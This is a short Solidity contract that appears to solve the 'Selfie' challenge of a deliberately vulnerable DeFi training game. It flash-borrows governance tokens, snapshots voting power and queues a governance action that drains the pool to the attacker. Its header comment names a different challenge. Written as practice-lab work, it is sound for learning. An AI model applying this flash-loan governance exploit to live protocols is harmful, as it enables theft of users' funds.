pragma solidity ^0.8.0;

/**
 * @title SideEntranceAttacker
 * @author Yasaman (Jasmine) Abtahi
 */

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

contract SelfieAttacker {
    
    using SafeMath for uint256;
    using Address for address payable;
    

    SelfiePool pool;
    address payable attacker;
    DamnValuableTokenSnapshot token;
    uint256 public actionID;
    SimpleGovernance governance;

    constructor(address _SelfiePool, address _attacker, address _token, address _governance) {
        pool = SelfiePool(_SelfiePool);
        attacker = payable(_attacker);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function receiveTokens(address _token, uint256 borrowAmount) external payable {
        token.snapshot();
        token.transfer(address(pool), borrowAmount);
        bytes memory callData = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionID = governance.queueAction(address(pool), callData, 0);
    }

    function attack() public {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }
}

